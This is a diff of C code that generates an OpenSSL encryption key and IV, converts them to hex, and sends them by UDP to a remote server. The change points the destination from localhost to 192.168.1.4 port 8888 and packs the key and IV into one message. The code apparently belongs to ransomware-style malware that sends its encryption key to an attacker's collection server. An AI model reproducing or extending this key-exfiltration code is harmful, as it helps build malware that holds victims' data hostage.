@@ -96,20 +96,12 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	bytes_to_hexa(iv, pIv, OPENSSL_IV_SIZE + 1);
 
 	send_key(pKey, pIv);
-
-	//Display infos for dev help
-	
-	//printf("[INFO:GENERATE_IV] IV addr : %s\n", iv);
-	//printf("[INFO:GENERATE_IV] IV val    : %s\n", pIv);
-
-	//printf("[INFO:GENERATE_KEY] key addr : %s\n", key);
-	//printf("[INFO:GENERATE_KEY] key val  : %s\n", pKey);
 }
 
 int send_key(char *pKey, char *pIv){
 	int sockid;
 	int server_port = 8888;
-	char *server_ip = "127.0.0.1";
+	char *server_ip = "192.168.1.4";
 
 	sockid = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -120,10 +112,10 @@ int send_key(char *pKey, char *pIv){
 
 	int bind_result = bind(sockid, (struct sockaddr *) &server_addr, sizeof(server_addr));
 
-	char *separater = " | ";
-	sendto(sockid, (const char *)pKey, strlen(pKey), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
-	sendto(sockid, (const char *)separater, strlen(separater), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
-	sendto(sockid, (const char *)pIv, strlen(pIv), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
+	char msg[((OPENSSL_KEY_SIZE * 2) + (OPENSSL_IV_SIZE * 2) + 3)];
+	snprintf(msg, sizeof(msg), "%s | %s", pKey, pIv);
+
+	sendto(sockid, (const char *)msg, strlen(msg), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
 
 	close(sockid);
 }
